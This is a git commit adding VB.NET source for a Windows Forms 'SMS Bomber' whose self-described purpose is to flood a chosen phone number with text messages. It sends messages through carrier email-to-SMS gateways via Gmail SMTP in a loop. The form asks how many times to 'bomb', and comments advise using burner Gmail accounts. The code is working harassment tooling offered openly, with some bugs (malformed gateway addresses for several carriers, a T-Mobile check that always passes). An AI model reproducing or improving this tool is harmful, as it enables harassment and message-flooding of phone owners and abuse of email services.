7dc8624ccf5cc1b3a5d9eb27358c57246d1fe53d
Roman.RII <romanrivas74@yahoo.com>
2018-06-12 20:45:17 -0700

    SMS Bomber source
    Written in VB.net, has explanations to all the coding that was used.

---
+++ SMSBomber/SMSBomber.Designer.vb
@@ -0,0 +1,510 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class SMSBomber
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Me.Label4 = New System.Windows.Forms.Label()
+        Me.multipleText = New System.Windows.Forms.CheckBox()
+        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
+        Me.emailPass = New System.Windows.Forms.TextBox()
+        Me.Label7 = New System.Windows.Forms.Label()
+        Me.emailEmail = New System.Windows.Forms.TextBox()
+        Me.Label6 = New System.Windows.Forms.Label()
+        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
+        Me.Label5 = New System.Windows.Forms.Label()
+        Me.Subject = New System.Windows.Forms.TextBox()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.MessageToBomb = New System.Windows.Forms.TextBox()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.BombTime = New System.Windows.Forms.TextBox()
+        Me.Start = New System.Windows.Forms.Button()
+        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
+        Me.alltel = New System.Windows.Forms.RadioButton()
+        Me.metropcs = New System.Windows.Forms.RadioButton()
+        Me.att = New System.Windows.Forms.RadioButton()
+        Me.sprint = New System.Windows.Forms.RadioButton()
+        Me.tmobile = New System.Windows.Forms.RadioButton()
+        Me.verizon = New System.Windows.Forms.RadioButton()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.PhoneNumber = New System.Windows.Forms.TextBox()
+        Me.bluegrass = New System.Windows.Forms.RadioButton()
+        Me.boost = New System.Windows.Forms.RadioButton()
+        Me.cellcom = New System.Windows.Forms.RadioButton()
+        Me.cricket = New System.Windows.Forms.RadioButton()
+        Me.rogers = New System.Windows.Forms.RadioButton()
+        Me.virgin = New System.Windows.Forms.RadioButton()
+        Me.Label8 = New System.Windows.Forms.Label()
+        Me.Label9 = New System.Windows.Forms.Label()
+        Me.Label10 = New System.Windows.Forms.Label()
+        Me.Label11 = New System.Windows.Forms.Label()
+        Me.Label12 = New System.Windows.Forms.Label()
+        Me.Label13 = New System.Windows.Forms.Label()
+        Me.Label14 = New System.Windows.Forms.Label()
+        Me.GroupBox3.SuspendLayout()
+        Me.GroupBox2.SuspendLayout()
+        Me.GroupBox1.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.Location = New System.Drawing.Point(12, 94)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(155, 13)
+        Me.Label4.TabIndex = 31
+        Me.Label4.Text = "Check if you want multiple texts"
+        '
+        'multipleText
+        '
+        Me.multipleText.AutoSize = True
+        Me.multipleText.Location = New System.Drawing.Point(12, 110)
+        Me.multipleText.Name = "multipleText"
+        Me.multipleText.Size = New System.Drawing.Size(79, 17)
+        Me.multipleText.TabIndex = 30
+        Me.multipleText.Text = "Do Multiple"
+        Me.multipleText.UseVisualStyleBackColor = True
+        '
+        'GroupBox3
+        '
+        Me.GroupBox3.Controls.Add(Me.Label11)
+        Me.GroupBox3.Controls.Add(Me.Label10)
+        Me.GroupBox3.Controls.Add(Me.emailPass)
+        Me.GroupBox3.Controls.Add(Me.Label7)
+        Me.GroupBox3.Controls.Add(Me.emailEmail)
+        Me.GroupBox3.Controls.Add(Me.Label6)
+        Me.GroupBox3.Location = New System.Drawing.Point(200, 120)
+        Me.GroupBox3.Name = "GroupBox3"
+        Me.GroupBox3.Size = New System.Drawing.Size(159, 96)
+        Me.GroupBox3.TabIndex = 29
+        Me.GroupBox3.TabStop = False
+        Me.GroupBox3.Text = "Login Info"
+        '
+        'emailPass
+        '
+        Me.emailPass.Location = New System.Drawing.Point(6, 71)
+        Me.emailPass.Name = "emailPass"
+        Me.emailPass.Size = New System.Drawing.Size(150, 20)
+        Me.emailPass.TabIndex = 19
+        '
+        'Label7
+        '
+        Me.Label7.AutoSize = True
+        Me.Label7.Location = New System.Drawing.Point(6, 55)
+        Me.Label7.Name = "Label7"
+        Me.Label7.Size = New System.Drawing.Size(56, 13)
+        Me.Label7.TabIndex = 20
+        Me.Label7.Text = "Password:"
+        '
+        'emailEmail
+        '
+        Me.emailEmail.Location = New System.Drawing.Point(6, 32)
+        Me.emailEmail.Name = "emailEmail"
+        Me.emailEmail.Size = New System.Drawing.Size(150, 20)
+        Me.emailEmail.TabIndex = 17
+        '
+        'Label6
+        '
+        Me.Label6.AutoSize = True
+        Me.Label6.Location = New System.Drawing.Point(6, 16)
+        Me.Label6.Name = "Label6"
+        Me.Label6.Size = New System.Drawing.Size(35, 13)
+        Me.Label6.TabIndex = 18
+        Me.Label6.Text = "Email:"
+        '
+        'GroupBox2
+        '
+        Me.GroupBox2.Controls.Add(Me.Label9)
+        Me.GroupBox2.Controls.Add(Me.Label8)
+        Me.GroupBox2.Controls.Add(Me.Label5)
+        Me.GroupBox2.Controls.Add(Me.Subject)
+        Me.GroupBox2.Controls.Add(Me.Label3)
+        Me.GroupBox2.Controls.Add(Me.MessageToBomb)
+        Me.GroupBox2.Location = New System.Drawing.Point(200, 12)
+        Me.GroupBox2.Name = "GroupBox2"
+        Me.GroupBox2.Size = New System.Drawing.Size(159, 102)
+        Me.GroupBox2.TabIndex = 28
+        Me.GroupBox2.TabStop = False
+        Me.GroupBox2.Text = "INFO"
+        '
+        'Label5
+        '
+        Me.Label5.AutoSize = True
+        Me.Label5.Location = New System.Drawing.Point(6, 16)
+        Me.Label5.Name = "Label5"
+        Me.Label5.Size = New System.Drawing.Size(46, 13)
+        Me.Label5.TabIndex = 16
+        Me.Label5.Text = "Subject:"
+        '
+        'Subject
+        '
+        Me.Subject.Location = New System.Drawing.Point(6, 29)
+        Me.Subject.Name = "Subject"
+        Me.Subject.Size = New System.Drawing.Size(150, 20)
+        Me.Subject.TabIndex = 15
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(6, 56)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(96, 13)
+        Me.Label3.TabIndex = 12
+        Me.Label3.Text = "Message To Bomb"
+        '
+        'MessageToBomb
+        '
+        Me.MessageToBomb.Location = New System.Drawing.Point(6, 72)
+        Me.MessageToBomb.Name = "MessageToBomb"
+        Me.MessageToBomb.Size = New System.Drawing.Size(150, 20)
+        Me.MessageToBomb.TabIndex = 11
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(9, 55)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(125, 13)
+        Me.Label2.TabIndex = 27
+        Me.Label2.Text = "How many times to bomb"
+        '
+        'BombTime
+        '
+        Me.BombTime.Location = New System.Drawing.Point(12, 71)
+        Me.BombTime.Name = "BombTime"
+        Me.BombTime.Size = New System.Drawing.Size(150, 20)
+        Me.BombTime.TabIndex = 26
+        Me.BombTime.Text = "5"
+        Me.BombTime.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Start
+        '
+        Me.Start.Location = New System.Drawing.Point(200, 222)
+        Me.Start.Name = "Start"
+        Me.Start.Size = New System.Drawing.Size(108, 23)
+        Me.Start.TabIndex = 25
+        Me.Start.Text = "Start Bombing"
+        Me.Start.UseVisualStyleBackColor = True
+        '
+        'GroupBox1
+        '
+        Me.GroupBox1.Controls.Add(Me.virgin)
+        Me.GroupBox1.Controls.Add(Me.rogers)
+        Me.GroupBox1.Controls.Add(Me.cricket)
+        Me.GroupBox1.Controls.Add(Me.cellcom)
+        Me.GroupBox1.Controls.Add(Me.boost)
+        Me.GroupBox1.Controls.Add(Me.bluegrass)
+        Me.GroupBox1.Controls.Add(Me.alltel)
+        Me.GroupBox1.Controls.Add(Me.metropcs)
+        Me.GroupBox1.Controls.Add(Me.att)
+        Me.GroupBox1.Controls.Add(Me.sprint)
+        Me.GroupBox1.Controls.Add(Me.tmobile)
+        Me.GroupBox1.Controls.Add(Me.Label13)
+        Me.GroupBox1.Controls.Add(Me.verizon)
+        Me.GroupBox1.Location = New System.Drawing.Point(12, 136)
+        Me.GroupBox1.Name = "GroupBox1"
+        Me.GroupBox1.Size = New System.Drawing.Size(150, 154)
+        Me.GroupBox1.TabIndex = 24
+        Me.GroupBox1.TabStop = False
+        Me.GroupBox1.Text = "Carriers"
+        '
+        'alltel
+        '
+        Me.alltel.AutoSize = True
+        Me.alltel.Location = New System.Drawing.Point(78, 63)
+        Me.alltel.Name = "alltel"
+        Me.alltel.Size = New System.Drawing.Size(47, 17)
+        Me.alltel.TabIndex = 7
+        Me.alltel.TabStop = True
+        Me.alltel.Text = "Alltel"
+        Me.alltel.UseVisualStyleBackColor = True
+        '
+        'metropcs
+        '
+        Me.metropcs.AutoSize = True
+        Me.metropcs.Location = New System.Drawing.Point(6, 63)
+        Me.metropcs.Name = "metropcs"
+        Me.metropcs.Size = New System.Drawing.Size(73, 17)
+        Me.metropcs.TabIndex = 6
+        Me.metropcs.TabStop = True
+        Me.metropcs.Text = "MetroPCS"
+        Me.metropcs.UseVisualStyleBackColor = True
+        '
+        'att
+        '
+        Me.att.AutoSize = True
+        Me.att.Location = New System.Drawing.Point(6, 19)
+        Me.att.Name = "att"
+        Me.att.Size = New System.Drawing.Size(46, 17)
+        Me.att.TabIndex = 2
+        Me.att.TabStop = True
+        Me.att.Text = "ATT"
+        Me.att.UseVisualStyleBackColor = True
+        '
+        'sprint
+        '
+        Me.sprint.AutoSize = True
+        Me.sprint.Location = New System.Drawing.Point(78, 42)
+        Me.sprint.Name = "sprint"
+        Me.sprint.Size = New System.Drawing.Size(52, 17)
+        Me.sprint.TabIndex = 5
+        Me.sprint.TabStop = True
+        Me.sprint.Text = "Sprint"
+        Me.sprint.UseVisualStyleBackColor = True
+        '
+        'tmobile
+        '
+        Me.tmobile.AutoSize = True
+        Me.tmobile.Location = New System.Drawing.Point(78, 19)
+        Me.tmobile.Name = "tmobile"
+        Me.tmobile.Size = New System.Drawing.Size(66, 17)
+        Me.tmobile.TabIndex = 3
+        Me.tmobile.TabStop = True
+        Me.tmobile.Text = "T-Mobile"
+        Me.tmobile.UseVisualStyleBackColor = True
+        '
+        'verizon
+        '
+        Me.verizon.AutoSize = True
+        Me.verizon.Location = New System.Drawing.Point(6, 42)
+        Me.verizon.Name = "verizon"
+        Me.verizon.Size = New System.Drawing.Size(60, 17)
+        Me.verizon.TabIndex = 4
+        Me.verizon.TabStop = True
+        Me.verizon.Text = "Verizon"
+        Me.verizon.UseVisualStyleBackColor = True
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Location = New System.Drawing.Point(12, 9)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(145, 13)
+        Me.Label1.TabIndex = 23
+        Me.Label1.Text = "Enter 10-Digit Phone Number"
+        '
+        'PhoneNumber
+        '
+        Me.PhoneNumber.Location = New System.Drawing.Point(12, 25)
+        Me.PhoneNumber.Name = "PhoneNumber"
+        Me.PhoneNumber.Size = New System.Drawing.Size(150, 20)
+        Me.PhoneNumber.TabIndex = 22
+        Me.PhoneNumber.Text = "(xxx) xxx-xxx"
+        Me.PhoneNumber.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'bluegrass
+        '
+        Me.bluegrass.AutoSize = True
+        Me.bluegrass.Location = New System.Drawing.Point(6, 86)
+        Me.bluegrass.Name = "bluegrass"
+        Me.bluegrass.Size = New System.Drawing.Size(73, 17)
+        Me.bluegrass.TabIndex = 8
+        Me.bluegrass.TabStop = True
+        Me.bluegrass.Text = "BlueGrass"
+        Me.bluegrass.UseVisualStyleBackColor = True
+        '
+        'boost
+        '
+        Me.boost.AutoSize = True
+        Me.boost.Location = New System.Drawing.Point(78, 86)
+        Me.boost.Name = "boost"
+        Me.boost.Size = New System.Drawing.Size(52, 17)
+        Me.boost.TabIndex = 9
+        Me.boost.TabStop = True
+        Me.boost.Text = "Boost"
+        Me.boost.UseVisualStyleBackColor = True
+        '
+        'cellcom
+        '
+        Me.cellcom.AutoSize = True
+        Me.cellcom.Location = New System.Drawing.Point(6, 109)
+        Me.cellcom.Name = "cellcom"
+        Me.cellcom.Size = New System.Drawing.Size(62, 17)
+        Me.cellcom.TabIndex = 10
+        Me.cellcom.TabStop = True
+        Me.cellcom.Text = "Cellcom"
+        Me.cellcom.UseVisualStyleBackColor = True
+        '
+        'cricket
+        '
+        Me.cricket.AutoSize = True
+        Me.cricket.Location = New System.Drawing.Point(78, 109)
+        Me.cricket.Name = "cricket"
+        Me.cricket.Size = New System.Drawing.Size(58, 17)
+        Me.cricket.TabIndex = 11
+        Me.cricket.TabStop = True
+        Me.cricket.Text = "Cricket"
+        Me.cricket.UseVisualStyleBackColor = True
+        '
+        'rogers
+        '
+        Me.rogers.AutoSize = True
+        Me.rogers.Location = New System.Drawing.Point(6, 131)
+        Me.rogers.Name = "rogers"
+        Me.rogers.Size = New System.Drawing.Size(59, 17)
+        Me.rogers.TabIndex = 12
+        Me.rogers.TabStop = True
+        Me.rogers.Text = "Rogers"
+        Me.rogers.UseVisualStyleBackColor = True
+        '
+        'virgin
+        '
+        Me.virgin.AutoSize = True
+        Me.virgin.Location = New System.Drawing.Point(78, 131)
+        Me.virgin.Name = "virgin"
+        Me.virgin.Size = New System.Drawing.Size(51, 17)
+        Me.virgin.TabIndex = 13
+        Me.virgin.TabStop = True
+        Me.virgin.Text = "Virgin"
+        Me.virgin.UseVisualStyleBackColor = True
+        '
+        'Label8
+        '
+        Me.Label8.AutoSize = True
+        Me.Label8.Location = New System.Drawing.Point(51, 13)
+        Me.Label8.Name = "Label8"
+        Me.Label8.Size = New System.Drawing.Size(11, 13)
+        Me.Label8.TabIndex = 17
+        Me.Label8.Text = "*"
+        '
+        'Label9
+        '
+        Me.Label9.AutoSize = True
+        Me.Label9.Location = New System.Drawing.Point(97, 56)
+        Me.Label9.Name = "Label9"
+        Me.Label9.Size = New System.Drawing.Size(11, 13)
+        Me.Label9.TabIndex = 18
+        Me.Label9.Text = "*"
+        '
+        'Label10
+        '
+        Me.Label10.AutoSize = True
+        Me.Label10.Location = New System.Drawing.Point(41, 16)
+        Me.Label10.Name = "Label10"
+        Me.Label10.Size = New System.Drawing.Size(11, 13)
+        Me.Label10.TabIndex = 19
+        Me.Label10.Text = "*"
+        '
+        'Label11
+        '
+        Me.Label11.AutoSize = True
+        Me.Label11.Location = New System.Drawing.Point(61, 55)
+        Me.Label11.Name = "Label11"
+        Me.Label11.Size = New System.Drawing.Size(11, 13)
+        Me.Label11.TabIndex = 21
+        Me.Label11.Text = "*"
+        '
+        'Label12
+        '
+        Me.Label12.AutoSize = True
+        Me.Label12.Location = New System.Drawing.Point(156, 9)
+        Me.Label12.Name = "Label12"
+        Me.Label12.Size = New System.Drawing.Size(11, 13)
+        Me.Label12.TabIndex = 32
+        Me.Label12.Text = "*"
+        '
+        'Label13
+        '
+        Me.Label13.AutoSize = True
+        Me.Label13.Location = New System.Drawing.Point(44, 7)
+        Me.Label13.Name = "Label13"
+        Me.Label13.Size = New System.Drawing.Size(11, 13)
+        Me.Label13.TabIndex = 33
+        Me.Label13.Text = "*"
+        '
+        'Label14
+        '
+        Me.Label14.AutoSize = True
+        Me.Label14.Location = New System.Drawing.Point(197, 277)
+        Me.Label14.Name = "Label14"
+        Me.Label14.Size = New System.Drawing.Size(166, 13)
+        Me.Label14.TabIndex = 33
+        Me.Label14.Text = "If there is an *, the field is required"
+        '
+        'form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(373, 295)
+        Me.Controls.Add(Me.Label14)
+        Me.Controls.Add(Me.Label12)
+        Me.Controls.Add(Me.Label4)
+        Me.Controls.Add(Me.multipleText)
+        Me.Controls.Add(Me.GroupBox3)
+        Me.Controls.Add(Me.GroupBox2)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.BombTime)
+        Me.Controls.Add(Me.Start)
+        Me.Controls.Add(Me.GroupBox1)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.PhoneNumber)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
+        Me.Name = "form1"
+        Me.Text = "XxRomanIIxX SMS Bomber Source"
+        Me.GroupBox3.ResumeLayout(False)
+        Me.GroupBox3.PerformLayout()
+        Me.GroupBox2.ResumeLayout(False)
+        Me.GroupBox2.PerformLayout()
+        Me.GroupBox1.ResumeLayout(False)
+        Me.GroupBox1.PerformLayout()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Label4 As Label
+    Friend WithEvents multipleText As CheckBox
+    Friend WithEvents GroupBox3 As GroupBox
+    Friend WithEvents emailPass As TextBox
+    Friend WithEvents Label7 As Label
+    Friend WithEvents emailEmail As TextBox
+    Friend WithEvents Label6 As Label
+    Friend WithEvents GroupBox2 As GroupBox
+    Friend WithEvents Label5 As Label
+    Friend WithEvents Subject As TextBox
+    Friend WithEvents Label3 As Label
+    Friend WithEvents MessageToBomb As TextBox
+    Friend WithEvents Label2 As Label
+    Friend WithEvents BombTime As TextBox
+    Friend WithEvents Start As Button
+    Friend WithEvents GroupBox1 As GroupBox
+    Friend WithEvents alltel As RadioButton
+    Friend WithEvents metropcs As RadioButton
+    Friend WithEvents att As RadioButton
+    Friend WithEvents sprint As RadioButton
+    Friend WithEvents tmobile As RadioButton
+    Friend WithEvents verizon As RadioButton
+    Friend WithEvents Label1 As Label
+    Friend WithEvents PhoneNumber As TextBox
+    Friend WithEvents virgin As RadioButton
+    Friend WithEvents rogers As RadioButton
+    Friend WithEvents cricket As RadioButton
+    Friend WithEvents cellcom As RadioButton
+    Friend WithEvents boost As RadioButton
+    Friend WithEvents bluegrass As RadioButton
+    Friend WithEvents Label11 As Label
+    Friend WithEvents Label10 As Label
+    Friend WithEvents Label9 As Label
+    Friend WithEvents Label8 As Label
+    Friend WithEvents Label13 As Label
+    Friend WithEvents Label12 As Label
+    Friend WithEvents Label14 As Label
+End Class
---
+++ SMSBomber/SMSBomber.vb
@@ -0,0 +1,90 @@
+﻿Imports System.IO
+Imports System.Net
+Imports System.Net.Mail '' To send emails thru program
+Public Class SMSBomber
+    Dim value1 As String ''Raw phone number ie (xxx) xx-xx-xx-x or (xxx) xxx-xxx
+    Dim value2 As String '' Cleaned up phone number ie xxxxxxxxxx
+    Dim carrier As String '' phone number + carrier ie xxxxxxxxxx@mymetropcs.com
+    Dim EmailMessage As New MailMessage
+
+
+
+
+    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click, Start.Click
+        ''Cleans Up phone number to be able to message it
+        value1 = PhoneNumber.Text
+        value2 = value1.Replace("(", "").Replace(")", "").Replace("-", "").Replace(" ", "")
+        '' Checks which carrier is selected to use their preset
+        If metropcs.Checked = True Then
+            carrier = value2 + "@mymetropcs.com"
+        ElseIf att.Checked = True Then
+            carrier = value2 + "@txt.att.net"
+        ElseIf alltel.Checked = True Then
+            carrier = value2 + "@message.alltel.com"
+        ElseIf sprint.Checked = True Then
+            carrier = value2 + "@messaging.sprintpcs.com"
+        ElseIf tmobile.Checked + True Then
+            carrier = value2 + "@tmomail.net"
+        ElseIf verizon.Checked = True Then
+            carrier = value2 + "@vtext.com"
+        ElseIf bluegrass.Checked = True Then
+            carrier = value1 + "sms.bluecell.com"
+        ElseIf boost.Checked = True Then
+            carrier = value1 + "myboostmobile.com"
+        ElseIf cellcom.Checked = True Then
+            carrier = value1 + "cellcom.quiktxt.com"
+        ElseIf cricket.Checked = True Then
+            carrier = value1 + "mms.cricketwireless.net"
+        ElseIf rogers.Checked = True Then
+            carrier = value1 + "pcs.rogers.com"
+        ElseIf virgin.Checked = True Then
+            carrier = value1 + "vmbol.com"
+        End If
+        MsgBox("Sending text to: " + carrier)
+
+        Try
+            If multipleText.Checked = False Then '' This makes sure the user only wants to send one text at a click, not multiples
+                EmailMessage.From = New MailAddress(emailEmail.Text)    ''Uses email address (Recommended to use burner gmail accs)
+                EmailMessage.To.Add(carrier)    '' Shows who to text to ie xxxxxxxxxx@mymetropcs.com
+                EmailMessage.Subject = Subject.Text '' Subject line 
+                EmailMessage.Body = MessageToBomb.Text ''Message to text
+                EmailMessage.Priority = MailPriority.High   ''Urgent to send out
+                Dim SimpleSMTP As New SmtpClient("smtp.gmail.com") ''which smtp client to use
+                SimpleSMTP.Port = 587 ''Port
+                SimpleSMTP.EnableSsl = True ''ssl
+                SimpleSMTP.Credentials = New System.Net.NetworkCredential(emailEmail.Text, emailPass.Text) ''This allows the program to connect to which email you are going to use, and to log in. ie [ email: burneracc@gmail.com | pass: password123 ] and logs in 
+                SimpleSMTP.Send(EmailMessage) ''sends those delicious pie bombs
+            ElseIf multipleText.Checked = True Then '' if you want multiple texts, then this should be clicked
+                muliplebombs() ''Pull the lever Kronk
+            End If '' If you end this if, what if this if never was ended, imagine the horrors.                 The horrors...                  99% sure I spelt horror wrong....
+        Catch ex As Exception '' Catching exceptions like you boutta catch these hands
+            MsgBox("You done fucked up now A-Aron") '' Words of encouragment        || >>>> If this message does pop up, then you or the user more than likely imputed a non-applicable number. IE a letter or unknown character in the box
+        End Try
+
+
+    End Sub
+
+    Private Sub muliplebombs() ''This lever Kronk
+        Dim i As Integer = 0 '' Still have no clue what this exactly does after using it multiple times... pls explain... halp
+        Do Until i = BombTime.Text '' uses integer and equals bombtime, ie how many texts you want to send out
+            EmailMessage.From = New MailAddress(emailEmail.Text) ''See diagram above
+            EmailMessage.To.Add(carrier) '' why you still lookin
+            EmailMessage.Subject = Subject.Text '' look above you beast
+            EmailMessage.Body = MessageToBomb.Text '' nothing to see here
+            EmailMessage.Priority = MailPriority.High ''so much redbull injested at this moment
+            Dim SimpleSMTP As New SmtpClient("smtp.gmail.com") ''contemplating life values
+            SimpleSMTP.Port = 587 ''skimming through weed bag to see if i can roll
+            SimpleSMTP.EnableSsl = True ''no papers left
+            SimpleSMTP.Credentials = New System.Net.NetworkCredential(emailEmail.Text, emailPass.Text) '' pls donate joint papers
+            SimpleSMTP.Send(EmailMessage) ''blunts also accepted
+            i += 1 ''a vowel equals a number +1 each time it loops, whoda thunk
+
+        Loop '' You make a loop de loop and pull And your shoes are looking cool  
+
+    End Sub ''end all substitutes, or does it mean its ending multiple bomb sub, no body knows
+
+
+
+
+    ''class dismissed
+End Class
